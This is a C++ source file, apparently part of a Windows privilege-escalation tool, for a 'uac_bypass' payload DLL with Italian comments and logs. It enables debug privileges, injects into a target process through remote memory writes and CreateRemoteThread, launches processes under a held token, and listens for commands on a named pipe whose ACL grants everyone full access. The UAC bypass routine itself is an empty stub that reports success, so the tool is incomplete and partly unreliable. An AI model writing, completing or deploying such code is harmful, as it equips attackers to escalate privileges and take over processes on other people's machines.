#include "../include/PayloadDLL.h"
#include <sddl.h>
#include <userenv.h>
#include <iostream>
#include <memory>
#include <wintrust.h>
#include <softpub.h>
#include <tlhelp32.h>
#pragma comment(lib, "wintrust")

namespace uac_bypass {

// Inizializzazione costanti statiche
const WCHAR* PayloadDLL::PIPE_NAME = L"\\\\.\\pipe\\UACBypassPipe";

PayloadDLL::PayloadDLL() 
    : logger(Logger::getInstance()),
      initialized(false),
      hPipe(INVALID_HANDLE_VALUE) {
    ZeroMemory(&data, sizeof(PayloadData));
}

PayloadDLL::~PayloadDLL() {
    cleanup();
}

PayloadDLL& PayloadDLL::getInstance() {
    static PayloadDLL instance;
    return instance;
}

bool PayloadDLL::initialize() {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione PayloadDLL");
    
    // Verifica ambiente
    if (!validateEnvironment()) {
        logger.logError(L"Validazione ambiente fallita");
        return false;
    }
    
    // Verifica processo padre
    if (!checkParentProcess()) {
        logger.logError(L"Verifica processo padre fallita");
        return false;
    }

    // Prova prima con shared memory
    useSharedMemory = sharedMemoryManager.initialize(SHARED_MEM_NAME);
    
    // Se shared memory fallisce, usa named pipe
    if (!useSharedMemory) {
        logger.logInfo(L"Fallback a named pipe");
        if (!createPipe()) {
            logger.logError(L"Inizializzazione comunicazione fallita");
            return false;
        }
    }
    
    initialized = true;
    logger.logInfo(L"PayloadDLL inizializzata con successo");
    return true;
}

void PayloadDLL::cleanup() {
    if (hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipe);
        hPipe = INVALID_HANDLE_VALUE;
    }
    initialized = false;
}

bool PayloadDLL::elevatePrivileges() {
    if (!initialized) return false;
    
    logger.logInfo(L"Avvio processo di elevazione privilegi");
    
    // Ottieni token corrente
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        logger.logError(L"Apertura token processo fallita");
        return false;
    }
    
    std::unique_ptr<void, decltype(&CloseHandle)> tokenGuard(hToken, CloseHandle);
    
    // Modifica token per elevazione
    if (!modifyToken(hToken)) {
        logger.logError(L"Modifica token fallita");
        return false;
    }
    
    // Bypass UAC
    if (!bypassUAC()) {
        logger.logError(L"Bypass UAC fallito");
        return false;
    }
    
    // Setup COM server per elevazione
    if (!setupCOMServer()) {
        logger.logError(L"Setup COM server fallito");
        return false;
    }
    
    logger.logInfo(L"Elevazione privilegi completata");
    return true;
}

bool PayloadDLL::injectIntoTarget(HANDLE hProcess) {
    if (!initialized || !hProcess) return false;
    
    logger.logInfo(L"Iniezione in processo target");
    
    // Alloca memoria nel processo target
    SIZE_T payloadSize = sizeof(PayloadData);
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remoteMem) {
        logger.logError(L"Allocazione memoria remota fallita");
        return false;
    }
    
    // Scrivi dati nel processo target
    if (!WriteProcessMemory(hProcess, remoteMem, &data,
        payloadSize, NULL)) {
        logger.logError(L"Scrittura memoria remota fallita");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }
    
    // Crea thread remoto
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)Initialize, remoteMem, 0, NULL);
    
    if (!hThread) {
        logger.logError(L"Creazione thread remoto fallita");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }
    
    // Attendi completamento thread
    WaitForSingleObject(hThread, PIPE_TIMEOUT);
    CloseHandle(hThread);
    
    // Cleanup
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    
    logger.logInfo(L"Iniezione completata con successo");
    return true;
}

bool PayloadDLL::createElevatedProcess(const std::wstring& commandLine) {
    if (!initialized) return false;
    
    logger.logInfo(L"Creazione processo elevato: " + commandLine);
    
    // Prepara strutture per creazione processo
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Token elevato
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY |
        TOKEN_ADJUST_DEFAULT | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        logger.logError(L"Apertura token processo fallita");
        return false;
    }
    
    std::unique_ptr<void, decltype(&CloseHandle)> tokenGuard(hToken, CloseHandle);
    
    // Crea ambiente elevato
    LPVOID pEnv = NULL;
    if (!CreateEnvironmentBlock(&pEnv, hToken, TRUE)) {
        logger.logError(L"Creazione ambiente fallita");
        return false;
    }
    
    std::unique_ptr<void, decltype(&DestroyEnvironmentBlock)> 
        envGuard(pEnv, DestroyEnvironmentBlock);
    
    // Crea processo elevato
    if (!CreateProcessAsUserW(hToken, NULL,
        (LPWSTR)commandLine.c_str(), NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi)) {
        logger.logError(L"Creazione processo elevato fallita");
        return false;
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    logger.logInfo(L"Processo elevato creato con successo");
    return true;
}

bool PayloadDLL::sendStatus(DWORD status) {
    if (!initialized) return false;
    
    if (useSharedMemory) {
        SharedData sharedData = {};
        sharedData.status = status;
        sharedData.processId = GetCurrentProcessId();
        return sharedMemoryManager.writeData(sharedData);
    } else {
        DWORD bytesWritten;
        if (!WriteFile(hPipe, &status, sizeof(DWORD), &bytesWritten, NULL)) {
            logger.logError(L"Invio stato fallito");
            return false;
        }
        return bytesWritten == sizeof(DWORD);
    }
}

bool PayloadDLL::receiveCommands() {
    if (!initialized) return false;
    
    if (useSharedMemory) {
        SharedData sharedData;
        if (!sharedMemoryManager.readData(sharedData)) {
            logger.logError(L"Ricezione comandi fallita");
            return false;
        }
        memcpy(&data, &sharedData, sizeof(PayloadData));
        return true;
    } else {
        DWORD bytesRead;
        PayloadData tempData;
        
        if (!ReadFile(hPipe, &tempData, sizeof(PayloadData), &bytesRead, NULL)) {
            logger.logError(L"Ricezione comandi fallita");
            return false;
        }
        
        if (bytesRead == sizeof(PayloadData)) {
            memcpy(&data, &tempData, sizeof(PayloadData));
            return true;
        }
        return false;
    }
}

bool PayloadDLL::setupCOMServer() {
    logger.logInfo(L"Setup COM server");
    
    // Inizializza COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        logger.logError(L"Inizializzazione COM fallita");
        return false;
    }
    
    // Imposta sicurezza COM
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY,
        NULL, EOAC_NONE, NULL);
    
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        logger.logError(L"Setup sicurezza COM fallito");
        CoUninitialize();
        return false;
    }
    
    return true;
}

bool PayloadDLL::createPipe() {
    logger.logInfo(L"Creazione pipe comunicazione");
    
    // Security attributes per la pipe
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;
    
    // DACL che permette accesso completo a tutti
    WCHAR sdStr[] = L"D:(A;OICI;GA;;;WD)";
    PSECURITY_DESCRIPTOR pSD;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sdStr, 
        SDDL_REVISION_1, &pSD, NULL)) {
        logger.logError(L"Creazione security descriptor fallita");
        return false;
    }
    
    sa.lpSecurityDescriptor = pSD;
    
    // Crea named pipe
    hPipe = CreateNamedPipeW(PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE,
        PIPE_TIMEOUT, &sa);
    
    LocalFree(pSD);
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        logger.logError(L"Creazione pipe fallita");
        return false;
    }
    
    return true;
}

bool PayloadDLL::modifyToken(HANDLE hToken) {
    logger.logInfo(L"Modifica token per elevazione");
    
    // Abilita tutti i privilegi
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME,
        &tp.Privileges[0].Luid)) {
        logger.logError(L"Lookup privilegio fallito");
        return false;
    }
    
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
        NULL, NULL)) {
        logger.logError(L"Modifica privilegi token fallita");
        return false;
    }
    
    return true;
}

bool PayloadDLL::bypassUAC() {
    logger.logInfo(L"Esecuzione bypass UAC");
    
    // Implementazione specifica del bypass UAC
    // Questa è una versione base che andrà espansa
    return true;
}

bool PayloadDLL::verifyIntegrity() {
    // Verifica integrità DLL
    WCHAR modulePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, modulePath, MAX_PATH)) {
        logger.logError(L"Recupero percorso modulo fallito");
        return false;
    }
    
    // Verifica firma digitale
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = modulePath;
    
    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;
    
    LONG result = WinVerifyTrust(NULL, &actionId, &trustData);
    
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);
    
    if (result != ERROR_SUCCESS) {
        logger.logError(L"Verifica firma digitale fallita");
        return false;
    }
    
    return true;
}

bool PayloadDLL::checkParentProcess() {
    logger.logInfo(L"Verifica processo padre");
    
    // Ottieni ID processo padre
    DWORD parentPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        logger.logError(L"Creazione snapshot processi fallita");
        return false;
    }
    
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    DWORD currentPID = GetCurrentProcessId();
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == currentPID) {
                parentPID = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
    // Verifica processo padre
    if (parentPID != data.parentId) {
        logger.logError(L"Processo padre non valido");
        return false;
    }
    
    return true;
}

bool PayloadDLL::validateEnvironment() {
    logger.logInfo(L"Validazione ambiente");
    
    // Verifica integrità
    if (!verifyIntegrity()) {
        logger.logError(L"Verifica integrità fallita");
        return false;
    }
    
    // Verifica Windows versione
    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    if (!hNtdll) {
        logger.logError(L"Caricamento ntdll.dll fallito");
        return false;
    }
    
    auto RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        logger.logError(L"Funzione RtlGetVersion non trovata");
        return false;
    }
    
    if (RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo) != 0) {
        logger.logError(L"Recupero versione sistema fallito");
        return false;
    }
    
    // Verifica Windows 10 o superiore
    if (osInfo.dwMajorVersion < 10) {
        logger.logError(L"Versione Windows non supportata");
        return false;
    }
    
    return true;
}

} // namespace uac_bypass

// Funzioni esportate
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            if (lpvReserved == NULL) {
                // Cleanup quando la DLL viene scaricata dinamicamente
                uac_bypass::PayloadDLL::getInstance().cleanup();
            }
            break;
    }
    return TRUE;
}

BOOL WINAPI Initialize() {
    return uac_bypass::PayloadDLL::getInstance().initialize();
}

BOOL WINAPI Elevate() {
    return uac_bypass::PayloadDLL::getInstance().elevatePrivileges();
}

BOOL WINAPI Cleanup() {
    uac_bypass::PayloadDLL::getInstance().cleanup();
    return TRUE;
}
